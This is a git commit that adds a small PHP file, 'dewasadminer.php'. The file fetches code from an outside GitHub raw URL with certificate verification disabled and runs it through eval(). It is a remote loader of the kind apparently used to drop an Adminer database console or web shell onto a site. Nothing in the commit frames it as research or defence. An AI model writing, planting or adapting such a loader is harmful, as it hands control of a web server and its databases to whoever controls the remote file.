a05596fc5d7977faf632d6ac9ae51b2a4696e9af
seokerens <randomprsnn404@gmail.com>
2025-10-27 16:34:35 +0700

    Create dewasadminer.php

---
+++ dewasadminer.php
@@ -0,0 +1,13 @@
+<?php
+$url = 'https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.phpp';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+if ($fileContents === false) {
+    die('[!] Cannot Get File : https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.php ');
+}
+eval("?>" . $fileContents);
+?>
